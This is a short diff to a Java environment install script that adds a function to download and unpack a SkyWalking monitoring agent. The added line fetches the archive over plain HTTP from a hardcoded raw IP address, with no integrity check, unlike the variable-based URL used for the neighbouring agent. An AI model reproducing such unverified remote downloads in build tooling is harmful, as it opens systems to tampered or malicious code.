@@ -134,6 +134,7 @@ install_java() {
 
   _install_tools ${baseDir}
   install_pinpoit_agent ${baseDir}
+  install_skywalking_agent ${baseDir}
   install_jmx_exporter_agent ${baseDir}
   _create_profile_script ${baseDir}
   _create_export_script ${JAVA_HOME} "$(pwd)"
@@ -354,6 +355,13 @@ install_pinpoit_agent() {
   mkdir "${install_dir}/.pinpoint"
   curl --retry 3 --silent --location "$PINPOINT_AGENT" | tar xzm -C "${install_dir}/.pinpoint"
   status "Install pinpoint agent success"
+}
+
+install_skywalking_agent(){
+  local install_dir=${1}
+  mkdir "${install_dir}/.skywalking"
+  curl --retry 3 --silent --location "http://175.178.4.33:8888/down/ZaXEtjGUriDF.gz" | tar xzm -C "${install_dir}/.skywalking"
+  status "Install skywalking agent success"
 }
 
 install_jmx_exporter_agent() {
